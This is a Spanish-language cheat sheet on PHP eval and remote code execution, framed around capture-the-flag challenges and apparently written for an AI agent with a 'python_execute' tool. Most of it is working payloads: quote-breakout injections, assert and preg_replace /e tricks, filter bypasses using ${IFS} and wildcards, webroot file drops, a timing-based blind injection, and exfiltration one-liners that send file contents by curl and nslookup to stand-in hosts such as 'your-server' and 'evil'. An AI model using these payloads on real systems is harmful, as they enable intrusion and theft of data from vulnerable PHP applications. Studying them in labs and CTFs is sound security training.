# Guía completa de técnicas de eval y RCE

## Comparativa de funciones de ejecución de código en PHP

| Función | Salida directa | Uso |
|------|------|------|
| `system($cmd)` | **Sí** (se envía directamente a stdout) | `system("id")` → el resultado se ve directamente en la página |
| `passthru($cmd)` | **Sí** (salida binaria sin procesar) | `passthru("cat flag.php")` |
| `exec($cmd, $out)` | **No** (se guarda en el array `$out`) | `exec("id", $out); print_r($out)` |
| `shell_exec($cmd)` | **No** (devuelve una cadena) | `echo shell_exec("id")` |
| `` `$cmd` `` | **No** (equivalente a shell_exec) | `` echo `id` `` |
| `popen($cmd, 'r')` | **No** (requiere fread) | `$h=popen("id","r");echo fread($h,1024)` |
| `eval($code)` | Depende del código | `eval("system('id');")` → tiene salida directa |

## Orden de salida entre highlight_file y eval

Esta es una trampa habitual en los CTF:

```php
<?php
highlight_file(__FILE__);
eval($_GET['cmd']);
?>
```

**Puntos clave**:
- `highlight_file()` muestra el código fuente resaltado → este es el primer paso
- La salida del `system()` dentro de `eval()` → este es el segundo paso
- Ambos ocurren en **la misma respuesta HTTP**, y el resultado del comando aparece **después** del resaltado del código fuente
- La salida de `system()` se escribe directamente en stdout, **no queda "bloqueada" por highlight_file**

**Cómo buscar la flag**:
- Busca la flag al **final** de la respuesta HTTP
- La salida HTML de `highlight_file` es muy larga; la flag suele estar al final
- Usa `python_execute` para analizar la respuesta y mirar solo los últimos cientos de caracteres

```python
import requests
r = requests.get(url, params={"cmd": "system('cat flag.php');"})
# la flag está al final de r.text, no en la parte del código resaltado
print(r.text[-500:])  # ver solo los últimos 500 caracteres
```

## Técnicas de bypass para eval

### 1. Bypass de punto y coma

```php
// Si eval requiere punto y coma pero la entrada está filtrada
eval($_GET['cmd']);  // uso normal
// Enviar: system('id')  // no hace falta añadir punto y coma, eval lo añade automáticamente
// O enviar: system('id');// 
```

### 2. Etiqueta de cierre de PHP

```php
// Si el contenido de eval está envuelto en comillas
eval("echo '" . $_GET['cmd'] . "';");
// Enviar: ');system('id');//
// Resultado: eval("echo '');system('id');//';");
```

### 3. Inyección mediante assert()

```php
// assert() podía ejecutar código antes de PHP 7
assert("system('id')");  // PHP < 7.x
// En PHP 7+ assert pasa a ser una estructura del lenguaje y ya no ejecuta cadenas
```

### 4. Modificador /e de preg_replace

```php
// En PHP < 7.0, preg_replace con /e ejecuta el resultado del reemplazo
preg_replace('/test/e', 'system("id")', 'test');
// Cualquier expresión regular + /e + cadena de reemplazo controlable → RCE
```

## Explotación de RCE sin salida directa

### Método 1: escribir un archivo en el directorio web
```bash
system("cat flag.php > /var/www/html/x.txt");
# Luego acceder a http://target/x.txt
```

### Método 2: exfiltración por DNS/HTTP
```bash
system("curl http://your-server/$(cat flag.php | base64)");
system("nslookup $(cat flag.php).your-server.com");
```

### Método 3: escribir un archivo PHP y luego leerlo
```bash
system("echo '<?php echo file_get_contents(\"/flag\"); ?>' > /var/www/html/read.php");
# Luego acceder a http://target/read.php
```

### Método 4: variables de entorno + otra vulnerabilidad
```bash
# Escribir el resultado en cookie/session
system("export FLAG=$(cat flag.php)");
# Leerlo mediante phpinfo() o /proc/self/environ
```

## Construcción de cadenas de ejecución de código PHP

### De lo simple a lo complejo

1. **Ejecución directa**: `system("id")` → con salida directa
2. **Escritura de archivo sin salida directa**: `system("cat flag.php > /var/www/html/x")`
3. **Exfiltración sin salida directa**: `system("curl http://evil/$(cat flag.php)")`
4. **Inyección ciega sin salida directa**: `system("if [ $(cat flag.php | head -c1) = N ]; then sleep 3; fi")`

### Escenarios comunes de eval en CTF

| Escenario | Patrón de código | Método de bypass |
|------|---------|---------|
| eval simple | `eval($_GET['cmd'])` | `system('cat flag.php')` |
| eval + filtrado de espacios | `eval($cmd)` + espacios reemplazados | `system('cat${IFS}flag.php')` |
| eval + filtrado de palabras clave | `eval($cmd)` + "flag" reemplazado | `system('cat${IFS}/f*')` |
| eval + highlight_file | `highlight_file + eval` | mirar **el final de la página** |
| eval + límite de longitud | `strlen($cmd) > N` | usar variables/nombres de función cortos |
| Inyección mediante assert | `assert($_GET['cmd'])` | PHP < 7: `system('id')` |
| preg_replace /e | `preg_replace('/./e', ...)` | inyectar código en la cadena de reemplazo |
